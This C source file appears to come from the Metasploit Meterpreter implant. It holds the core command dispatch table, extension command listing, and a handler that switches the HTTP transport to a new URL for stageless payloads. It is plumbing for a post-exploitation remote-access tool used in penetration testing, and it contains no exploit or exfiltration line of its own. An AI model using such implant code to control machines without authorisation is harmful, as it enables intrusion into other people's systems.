#include "metsrv.h"

#ifdef _WIN32
// see ReflectiveLoader.c...
extern HINSTANCE hAppInstance;
#endif

PLIST gExtensionList = NULL;

DWORD request_core_enumextcmd(Remote* remote, Packet* packet);
DWORD request_core_machine_id(Remote* remote, Packet* packet);
DWORD request_core_uuid(Remote* remote, Packet* packet);
#ifdef _WIN32
BOOL request_core_patch_url(Remote* remote, Packet* packet, DWORD* result);
#endif

// Dispatch table
Command customCommands[] = 
{
	COMMAND_REQ("core_loadlib", request_core_loadlib),
	COMMAND_REQ("core_enumextcmd", request_core_enumextcmd),
	COMMAND_REQ("core_machine_id", request_core_machine_id),
	COMMAND_REQ("core_uuid", request_core_uuid),
#ifdef _WIN32
	COMMAND_INLINE_REP("core_patch_url", request_core_patch_url),
#endif
	COMMAND_TERMINATOR
};

typedef struct _EnumExtensions
{
	Packet* pResponse;
	char* lpExtensionName;
} EnumExtensions, * PEnumExtensions;

BOOL ext_cmd_callback(LPVOID pState, LPVOID pData)
{
	PEnumExtensions pEnum = (PEnumExtensions)pState;
	Command* command = NULL;

	if (pEnum != NULL && pEnum->pResponse != NULL && pData != NULL)
	{
		PEXTENSION pExt = (PEXTENSION)pData;
		if (pExt->name[0] != '\0' && pEnum->lpExtensionName != NULL && strcmp(pExt->name, pEnum->lpExtensionName) == 0)
		{
			dprintf("[LISTEXT] Found extension: %s", pExt->name);
			for (command = pExt->start; command != pExt->end; command = command->next)
			{
				packet_add_tlv_string(pEnum->pResponse, TLV_TYPE_STRING, command->method);
			}
			dprintf("[LISTEXT] Finished listing extension: %s", pExt->name);

			return TRUE;
		}
	}
	return FALSE;
}

#ifdef _WIN32
BOOL request_core_patch_url(Remote* remote, Packet* packet, DWORD* result)
{
	// this is a special case because we don't actually send
	// response to this. This is a brutal switch without any
	// other forms of comms, and this is because of stageless
	// payloads
	if (remote->transport->type == METERPRETER_TRANSPORT_SSL)
	{
		// This shouldn't happen.
		*result = ERROR_INVALID_STATE;
	}
	else
	{
		HttpTransportContext* ctx = (HttpTransportContext*)remote->transport->ctx;
		ctx->new_uri = packet_get_tlv_value_wstring(packet, TLV_TYPE_TRANS_URL);
		*result = ERROR_SUCCESS;
	}
	return TRUE;
}
#endif

DWORD request_core_enumextcmd(Remote* remote, Packet* packet)
{
	BOOL bResult = FALSE;
	Packet* pResponse = packet_create_response(packet);

	if (pResponse != NULL)
	{
		EnumExtensions enumExt;
		enumExt.pResponse = pResponse;
		enumExt.lpExtensionName = packet_get_tlv_value_string(packet, TLV_TYPE_STRING);

		dprintf("[LISTEXTCMD] Listing extension commands for %s ...", enumExt.lpExtensionName);
		// Start by enumerating the names of the extensions
		bResult = list_enumerate(gExtensionList, ext_cmd_callback, &enumExt);

		packet_transmit_response(ERROR_SUCCESS, remote, pResponse);
	}

	return ERROR_SUCCESS;
}

/*
 * Registers custom command handlers
 */
VOID register_dispatch_routines()
{
	gExtensionList = list_create();

	command_register_all(customCommands);
}

/*
 * Deregisters previously registered custom commands and loaded extensions.
 */
VOID deregister_dispatch_routines(Remote * remote)
{
	while (TRUE)
	{
		PEXTENSION extension = list_pop(gExtensionList);
		if (!extension)
		{
			break;
		}

		if (extension->deinit)
		{
			extension->deinit(remote);
		}

		free(extension);
	}

	command_deregister_all(customCommands);

	list_destroy(gExtensionList);
}
